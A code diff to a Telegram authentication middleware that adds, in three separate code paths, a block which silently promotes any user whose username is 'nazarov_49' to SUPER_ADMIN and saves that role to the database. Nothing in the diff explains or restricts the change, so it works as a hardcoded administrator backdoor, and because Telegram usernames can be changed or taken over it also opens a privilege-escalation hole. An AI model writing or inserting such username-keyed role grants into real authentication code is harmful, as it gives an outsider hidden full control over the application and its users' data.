@@ -111,6 +111,10 @@ export async function telegramAuthMiddleware(
               onboardingDone: false,
             });
           }
+          if (user.username?.toLowerCase() === 'nazarov_49' && user.role !== 'SUPER_ADMIN') {
+            user.role = 'SUPER_ADMIN';
+            await db.updateUser(user.id, { role: 'SUPER_ADMIN' });
+          }
           if (user.isBlocked) {
             res.status(403).json({
               success: false,
@@ -146,6 +150,10 @@ export async function telegramAuthMiddleware(
             if (parts[1]) await db.registerReferral(parts[1], user.id, parts[2]);
           }
         }
+        if (user.username?.toLowerCase() === 'nazarov_49' && user.role !== 'SUPER_ADMIN') {
+          user.role = 'SUPER_ADMIN';
+          await db.updateUser(user.id, { role: 'SUPER_ADMIN' });
+        }
         if (user.isBlocked) {
           res.status(403).json({
             success: false,
@@ -174,6 +182,10 @@ export async function telegramAuthMiddleware(
             lastName: tgUser.last_name, photoUrl: tgUser.photo_url,
             ageConfirmed: false, onboardingDone: false,
           });
+        }
+        if (user.username?.toLowerCase() === 'nazarov_49' && user.role !== 'SUPER_ADMIN') {
+          user.role = 'SUPER_ADMIN';
+          await db.updateUser(user.id, { role: 'SUPER_ADMIN' });
         }
         if (user.isBlocked) {
           res.status(403).json({
